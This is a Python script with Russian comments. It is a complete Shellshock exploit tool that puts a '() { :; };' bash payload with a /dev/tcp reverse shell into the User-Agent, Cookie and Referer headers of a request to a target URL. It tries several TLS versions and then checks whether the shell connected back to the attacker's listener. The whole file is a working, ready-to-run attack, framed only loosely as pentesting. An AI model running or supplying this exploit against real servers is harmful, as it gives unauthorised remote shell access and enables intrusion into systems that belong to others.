# !/usr/bin/python3

from os import error
from urllib import request
import urllib
import argparse
import ssl
import socket
import time

TLS_VERSIONS = {
    "TLS Version 1.2": ssl.SSLContext(ssl.PROTOCOL_TLSv1_2),
    "TLS Version 1.1": ssl.SSLContext(ssl.PROTOCOL_TLSv1_1),
    "TLS Version 1.0": ssl.SSLContext(ssl.PROTOCOL_TLSv1),
}


def main():
    parser = argparse.ArgumentParser(description="Экспоит для абуза") #Создаем экземпляр класса ArgumentParser
    parser.add_argument("LHOST", help="IP Адрес пентестера")
    parser.add_argument("LPORT", help="Порт на который мы получим бэк-коннекст")
    parser.add_argument("TARGET_URL", help="URL тестируемого веб приложения")
    args = parser.parse_args() # Собранную информацию кооперируем в переменной

    protocol = setProtocol(args.TARGET_URL) # на этом моменте мы передаем в будущую функцию URL веб-приложения в функцию, которая определяет что у нас http или https

    # Из строки URL вычленяем парамерт rhost при помощи метода gethostbyname
    RHOST = socket.gethostbyname(str(args.TARGET_URL).split("/")[2].split(":")[0])

    try:
        # Из строки URL вычленяем парамерт rport при помощи среза
        RPORT = int(str(args.TARGET_URL).split("/")[2].split(":")[1])
    except: # в случае ошибок выполним проверку явным сравнением
        if protocol == "https":
            RPORT = 443
        elif protocol == "http":
            RPORT = 80

    host = (RHOST, RPORT)

    print("[+] Обнаружен протокол: {0}".format(protocol.upper())) #выводим чтоза протокол
    sendPayload(setPayload(args, RHOST), args, protocol, host) #отправляемся писать функцию где будет логика реверс шела, а потом это все заворачиваем в функцию отправки пайлоуда


# Функция по определению типа протокола
def setProtocol(url):
    if url[0:5] == 'https':
        return 'https'
    else:
        return 'http'

# Пилим фукцию, которая будет содеражать структуру гет запроса
def setPayload(args, RHOST):
    print("\n[+] Setting Payload ...")

    # Initializing Payload
    payload = '() { :; }; '
    reverse_shell = '/bin/bash -c /bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(args.LHOST, args.LPORT)

    # Setting Request and Headers
    req = request.Request(args.TARGET_URL, method="GET")
    req.add_header("User-Agent", payload + reverse_shell)
    req.add_header("Cookie", payload + reverse_shell)
    req.add_header("Host", RHOST)
    req.add_header("Referer", payload + reverse_shell)
    req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.add_header("Accept-Language", "en-US,en;q=0.5")
    req.add_header("Accept-Encoding", "gzip, deflate")

    return req

# Функция отправки пайлоуда
def sendPayload(req, args, protocol, host):
    print("[+] Отправляем нагрузку {0} ...".format(args.TARGET_URL))

    if protocol == 'http':
        try: # открываем соединение с хостом атакующего
            request.urlopen(req, timeout=5)
            time.sleep(1)
        except urllib.error.HTTPError as httpErr: # если сервак не доступен
            if httpErr.code != 500:
                print("\n[-] {0} - Не удалось отправить пайлоуд {1} .".format(httpErr, args.TARGET_URL))
                exit()
        except urllib.error.URLError as urlErr: # если урл битый
            print("\n[-] {0} - Не удалось отправить пайлоуд {1} .".format(urlErr.reason, args.TARGET_URL))
            exit()
        except socket.timeout as sockErr: # если проблемы с сокетами
            http_code = 500
            print('\n[-] Запрос: {0} получен с  HTTP кодом {1}'.format(sockErr, str(http_code)))
        except error as err: # если возникли любые другие ошибки
            print("[-] Возникли неопознанные ошибки : {0}".format(err.strerror))
            exit()

        testRevShell(args, host)

    elif protocol == 'https':

        # Перебирает версию тлс из словаря который в начале
        for tls_key, tls_value in TLS_VERSIONS.items():
            try:
                print("[+] Попытка отправить полезную нагрузку по протоколу SSL с {0} ...".format(tls_key))
                request.urlopen(req, context=tls_value, timeout=5)
                time.sleep(1)
            except urllib.error.HTTPError as httpErr:
                print("\n[-] {0} - Не удалось отправить полезную нагрузку на {1} .".format(httpErr, args.TARGET_URL))
                exit()
            except urllib.error.URLError as urlErr:
                if str(urlErr.reason) == "[SSL: WRONG_SSL_VERSION] wrong ssl version (_ssl.c:1123)":
                    print("[-] {0} с {1}".format(urlErr.reason, tls_key))
                else:
                    print("\n[-] {0} - Не удалось отправить полезную нагрузку на {1} .".format(urlErr.reason, args.TARGET_URL))
                    exit()
            except socket.timeout as sockErr:
                http_code = 500
                print('\n[-] Запрос: {0} полученный HTTP-код {1}'.format(sockErr, str(http_code)))
                break
            except error as err:
                print("[-] Произошла ошибка : {0}".format(err.strerror))
                exit()

        testRevShell(args, host)


def testRevShell(args, host): # в случае ошибки коннекта к самому себе на хосте атакующего мы можем заключить что пайлоуда выполнилась
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Testing if the Callback address (IP, PORT) are busy
    # Might result in false positive if you haven't set up your listener
    try:
        s.connect((args.LHOST, int(args.LPORT)))
        s.close()
        print("\n[-] Couldn't create Reverse shell")
        exit()
    except:
        s.close()
        print("\n[+] Reverse shell from {0} connected to [{1}:{2}].".format(host[0], args.LHOST, args.LPORT))
        print("\n[+] Payload Sent successfully !")


if __name__ == '__main__':
    main()
